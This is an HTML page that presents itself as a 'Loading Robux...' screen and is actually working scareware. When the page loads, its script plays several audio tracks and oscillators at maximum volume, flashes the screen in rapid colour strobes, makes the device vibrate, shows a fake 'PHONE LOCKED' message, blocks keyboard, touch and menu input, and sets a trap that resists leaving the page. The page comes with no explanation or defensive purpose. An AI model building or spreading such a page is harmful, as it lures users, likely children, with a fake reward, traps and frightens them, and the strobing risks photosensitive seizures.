<!DOCTYPE html>
<html>
<head>
    <title>Loading Robux...</title>
    <style>
        *{margin:0;padding:0;overflow:hidden;}
        body{
            height:100vh;
            background:#000;
            animation:hellflash 0.05s infinite;
        }
        @keyframes hellflash{
            0%{background:#ff0000;}
            25%{background:#00ff00;}
            50%{background:#0000ff;}
            75%{background:#ffff00;}
        }
        #lock{
            position:fixed;top:0;left:0;width:100%;height:100%;
            background:rgba(255,0,0,0.98);
            z-index:9999;
            pointer-events:auto;
        }
        #lock h1{
            position:absolute;top:50%;left:50%;
            transform:translate(-50%,-50%);
            font-size:8vw;
            color:#fff;
            text-shadow:0 0 20px #ff0;
        }
    </style>
</head>
<body>
    <!-- 5 AUDIO TRACKS = MAXIMUM LOUDNESS -->
    <audio id="a1" loop preload="auto" autoplay>
        <source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBSL3/9O9wE=" type="audio/wav">
    </audio>
    <audio id="a2" loop preload="auto" autoplay>
        <source src="data:audio/wav;base64,UklGRl0CAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBSL3/9O9wE=" type="audio/wav">
    </audio>
    <audio id="a3" loop preload="auto" autoplay>
        <source src="data:audio/wav;base64,UklGRmQCAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBSL3/9O9wE=" type="audio/wav">
    </audio>
    <audio id="a4" loop preload="auto" autoplay></audio>
    <audio id="a5" loop preload="auto" autoplay></audio>

    <div id="lock">
        <h1>🔒 PHONE LOCKED 🔒</h1>
    </div>

    <script>
        // AUTO MAX VOLUME SYSTEM
        const audios = ['a1','a2','a3','a4','a5'].map(id=>document.getElementById(id));
        
        // FORCE ALL AUDIO TO MAX VOLUME
        audios.forEach((audio, i) => {
            audio.volume = 1.0;
            audio.muted = false;
            
            // WEB AUDIO OVERLAY ON EACH
            audio.addEventListener('play', () => {
                const ctx = new AudioContext();
                const osc = ctx.createOscillator();
                const gain = ctx.createGain();
                osc.connect(gain);
                gain.connect(ctx.destination);
                
                osc.frequency.value = 700 + i * 200;  // Different pitches
                osc.type = ['sawtooth','square','triangle'][i%3];
                gain.gain.value = 1.0;
                
                osc.start();
                
                // CHAOTIC PITCH SWEEP
                setInterval(()=>{
                    osc.frequency.value = 400 + Math.sin(Date.now()*0.01 + i) * 1200;
                }, 20);
            });
        });
        
        // AUTO-RESUME EVERYTHING
        setInterval(()=>{
            audios.forEach(audio => {
                if(audio.paused || audio.muted){
                    audio.volume = 1.0;
                    audio.play().catch(()=>{});  
                }
            });
            
            // Force all AudioContexts alive
            if(window.AudioContext){
                const ctx = new AudioContext();
                ctx.resume();
            }
        }, 100);
        
        // PAGE LOAD = IMMEDIATE HELL
        document.addEventListener('DOMContentLoaded', ()=>{
            audios.forEach(audio => audio.play().catch(()=>{}));
            
            // VIBRATION HELL
            if(navigator.vibrate){
                setInterval(()=>navigator.vibrate([500,100,500]), 300);
            }
        });
        
        // USER INTERACTION = MORE HELL
        document.addEventListener('click', ()=>audios.forEach(a=>a.play()));
        document.addEventListener('touchstart', e=>{
            e.preventDefault();
            audios.forEach(a=>a.play());
        }, {passive:false});
        
        // TOTAL LOCK
        ['keydown','contextmenu','selectstart','dragstart','touchmove'].forEach(ev=>{
            document.addEventListener(ev, e=>e.preventDefault(), {passive:false});
        });
        
        window.onbeforeunload = ()=>"\u200B";  // Invisible trap
        
        // FLASHING LOCK SCREEN
        setInterval(()=>{
            const lock = document.getElementById('lock');
            lock.style.background = `hsl(${Date.now()*0.02%360},100%,50%)`;
        }, 30);
    </script>
</body>
</html>
